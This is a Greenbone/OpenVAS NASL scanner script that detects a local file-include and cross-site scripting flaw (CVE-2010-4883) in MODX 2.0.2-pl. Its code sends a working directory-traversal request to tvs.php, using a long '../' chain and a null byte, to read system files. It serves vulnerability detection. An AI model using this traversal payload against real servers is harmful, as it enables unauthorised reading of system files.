# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100833");
  script_version("2023-07-28T16:09:07+0000");
  script_tag(name:"last_modification", value:"2023-07-28 16:09:07 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2010-09-30 13:18:50 +0200 (Thu, 30 Sep 2010)");
  script_tag(name:"cvss_base", value:"2.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2010-4883");
  script_name("MODX Local File Include and Cross Site Scripting Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("gb_modx_cms_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("modx_cms/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/43577");

  script_tag(name:"summary", value:"MODX is prone to a local file-include vulnerability and a cross-site
  scripting vulnerability because it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit the local file-include vulnerability using
  directory-traversal strings to view and execute local files within
  the context of the webserver process. Information harvested may aid
  in further attacks.

  The attacker may leverage the cross-site scripting issue to execute
  arbitrary script code in the browser of an unsuspecting user in the
  context of the affected site. This may let the attacker steal cookie-
  based authentication credentials and launch other attacks.");

  script_tag(name:"affected", value:"MODX 2.0.2-pl is vulnerable, other versions may also be affected.");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
  a newer release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

cpe_list = make_list( "cpe:/a:modx:unknown",
                      "cpe:/a:modx:revolution",
                      "cpe:/a:modx:evolution" );

if( ! infos = get_app_port_from_list( cpe_list:cpe_list ) )
  exit( 0 );

cpe = infos["cpe"];
port = infos["port"];

if( ! dir = get_app_location( cpe:cpe, port:port ) )
  exit( 0 );

if( dir == "/" ) dir = "";

files = traversal_files();

foreach file( keys( files ) ) {

  url = string(dir, "/manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../../../../../../../",files[file],"%00");
  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
